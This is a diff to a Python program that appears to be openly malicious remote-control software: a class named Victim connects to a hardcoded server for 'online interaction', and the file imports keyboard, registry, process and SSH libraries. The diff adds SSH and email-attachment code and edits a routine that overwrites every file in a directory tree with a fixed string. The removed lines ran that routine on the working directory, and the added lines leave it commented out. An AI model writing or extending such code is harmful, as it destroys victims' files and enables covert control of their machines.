@@ -6,6 +6,12 @@ import psutil
 import subprocess
 import keyboard
 import winreg
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import paramiko
+
 
 class EmailSender:
     def __init__(self, smtp_server, smtp_port, username, password):
@@ -41,6 +47,7 @@ class EmailSender:
             print("Email sent successfully!")
         except smtplib.SMTPException as e:
             print("Failed to send email. Error:", str(e))
+
 
 class Victim:
     def __init__(self, server_ip, server_port):
@@ -182,29 +189,61 @@ class Victim:
 
         return detected_browsers
 
+
 def rewrite_files_in_directory(directory):
     for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
             rewrite_file(file_path)
 
+
 def rewrite_file(file_path):
     print(f"Rewriting file: {file_path}")
     with open(file_path, "w") as file:
-        file.write("COTTONCANDYISTHEBESTCANDY!")
+        file.write("This file has been modified by a malicious program.")
 
-def receive_command():
-    command = input("Enter a command: ")
-    return command
+
+def ssh_to_server(host, port, username, password):
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh_client.connect(host, port, username, password)
+        print("Connected to the server via SSH.")
+
+        command = "ls"
+        stdin, stdout, stderr = ssh_client.exec_command(command)
+        output = stdout.read().decode()
+        print(f"Command output:\n{output}")
+
+        ssh_client.close()
+    except paramiko.AuthenticationException:
+        print("Authentication failed. Please check your credentials.")
+    except paramiko.SSHException as e:
+        print("SSH connection failed:", str(e))
+    except paramiko.ssh_exception.NoValidConnectionsError:
+        print("Unable to connect to the server.")
+    except socket.gaierror:
+        print("Invalid server hostname.")
+    except socket.timeout:
+        print("Connection timed out.")
+
 
 def main():
-    server_ip = "192.168.0.100"
-    server_port = 12345
+    # Victim settings
+    victim_ip = "192.168.0.100"
+    victim_port = 1234
 
-    victim = Victim(server_ip, server_port)
+    # Connect to the server
+    victim = Victim(victim_ip, victim_port)
     victim.connect_to_server()
+
+    # Perform online interaction with the server
     victim.online_interaction()
 
-if __name__ == '__main__':
+    # Perform additional actions (optional)
+    # rewrite_files_in_directory("/path/to/directory")
+    # ssh_to_server("example.com", 22, "username", "password")
+
+
+if __name__ == "__main__":
     main()
-    rewrite_files_in_directory(os.getcwd())
